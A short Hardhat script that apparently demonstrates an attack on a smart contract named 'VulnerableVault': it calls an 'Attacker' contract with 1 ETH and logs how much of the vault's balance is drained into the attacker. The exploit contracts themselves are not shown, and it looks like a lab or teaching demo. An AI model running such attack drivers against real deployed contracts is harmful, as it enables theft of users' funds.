import { network } from "hardhat";
 
async function main() {
  const { ethers } = await network.connect();
  const signers = await ethers.getSigners();
 
  const vault = await ethers.getContractAt(
    "VulnerableVault",
    "0x2bb1C94151bF784c58cdCe7624E553CDB08a9f58"
  );
  const attackerContract = await ethers.getContractAt(
    "Attacker",
    "0xfd20619eA5E046F459A7fC8874A0D21c80B3d31d",
    signers[3]
  );
 
  const vaultBalanceBefore = await vault.getBalance();
  console.log("Vault balance BEFORE attack:", ethers.formatEther(vaultBalanceBefore), "ETH");
 
  const tx = await attackerContract.attack({ value: ethers.parseEther("1") });
  await tx.wait();
 
  const vaultBalanceAfter = await vault.getBalance();
  const stolen = await attackerContract.stolenBalance();
 
  console.log("Vault balance AFTER attack:", ethers.formatEther(vaultBalanceAfter), "ETH");
  console.log("Attacker contract now holds:", ethers.formatEther(stolen), "ETH");
}
 
main().catch(console.error);
